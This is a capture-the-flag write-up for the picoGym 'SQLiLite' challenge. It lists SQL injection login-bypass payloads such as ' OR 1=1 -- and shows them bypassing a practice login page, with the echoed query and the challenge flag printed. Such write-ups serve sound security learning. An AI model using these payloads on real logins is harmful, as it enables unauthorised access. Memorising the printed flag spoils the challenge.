# picoGym Level 304: SQLiLite
Source: https://play.picoctf.org/practice/challenge/304

## Goal
Can you login to this website?<br>
Try to login here.<br>
http://saturn.picoctf.net:49286/

## What I learned
```
SQL injection vulnerability

Google: SQL injection payloads
' OR 1=1 --
' OR '1'='1' --
' OR '1'='1' #
' OR 1=1 #
' OR 1=1/*
admin' --
admin' #
admin'/*

https://github.com/payloadbox/sql-injection-payload-list
https://tib3rius.com/sqli.html
```

## Solution
```
https://webshell.picoctf.org/

# View Page Source, See if using PHP
AsianHacker-picoctf@webshell:~$ curl -I http://saturn.picoctf.net:49286/ ⌨️
HTTP/1.1 200 OK
Server: nginx 👀 Note: Couldn't detect this way
Date: Fri, 22 Aug 2025 15:58:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding

<!doctype html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
</head>
<body>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="panel panel-primary" style="margin-top:50px">
                <div class="panel-heading">
                    <h3 class="panel-title">Log In</h3>
                </div>
                <div class="panel-body">
                    <form action="login.php👀" method="POST">
                        <fieldset>
                            <div class="form-group">
                                <label for="username">Username:</label>
                                <input type="text" id="username" name="username" class="form-control">
                            </div>
                            <div class="form-group">
                                <label for="password">Password:</label>
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control">
                                </div>
                            </div>

                            <input type="hidden" name="debug" value="0">

                            <div class="form-actions">
                                <input type="submit" value="Login" class="btn btn-primary">
                            </div>
                        </fieldset>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>

Browser: http://saturn.picoctf.net:49286/login.php ⌨️
username: 
password: 
SQL query: SELECT * FROM users WHERE name='' AND password=''
Login failed.
# View Page Source
Browser: view-source:saturn.picoctf.net:49286/login.php
<pre>username: 
password: 
SQL query: SELECT * FROM users WHERE name=&#039;&#039; AND password=&#039;&#039; 👀
</pre><h1>Login failed.</h1>

username: admin ⌨️
password: admin ⌨️
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
Login failed.

username: admin ⌨️
password: ' OR 1=1 -- ⌨️👀
SQL query: SELECT * FROM users WHERE name='admin' AND password='' OR 1=1 --'
Logged in! But can you see the flag, it is in plainsight.

# View Page Source
Browser: view-source:http://saturn.picoctf.net:49286/login.php ⌨️

<pre>username: admin
password: &#039; OR 1=1 --
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; OR 1=1 --&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p> 🔐
```

## Flag
picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}

## Continue
[Continue](./picoGym0303.md)